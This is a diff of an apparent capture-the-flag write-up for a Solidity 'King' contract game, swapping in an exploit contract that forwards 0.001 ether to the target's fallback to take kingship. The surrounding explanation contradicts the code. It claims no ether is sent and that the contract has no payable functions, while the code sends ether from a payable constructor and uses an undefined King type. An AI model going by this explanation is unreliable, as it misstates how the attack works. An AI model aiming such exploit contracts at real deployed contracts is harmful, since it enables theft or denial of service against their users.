@@ -40,17 +40,15 @@ This contract features a simple game where participants can become the "king" by
 Our goal is to become the king without actually sending any ether to the contract. To achieve this, we'll deploy an exploit contract that intercepts the incoming ether and prevents the King contract from updating the king. Here's the exploit contract:
 
     ```solidity
-    // SPDX-License-Identifier: MIT
-    pragma solidity ^0.8.0;
-    
     contract Exploit {
+        King target;
     
-      // Exploit contract does not accept any ether
-    
-      constructor() payable {
-        // No ether should be sent to this contract
-        revert("Exploit contract does not accept ether");
-      }
+        constructor(address _target) payable {
+            target = King(_target);
+            // Call the target contract's fallback function and send 0.001 ether
+            (bool success, ) = _target.call{value: 0.001 ether}("");
+            require(success, "Call failed");
+        }
     }
 
 This Exploit contract does not have any payable functions, meaning it rejects any ether sent to it.
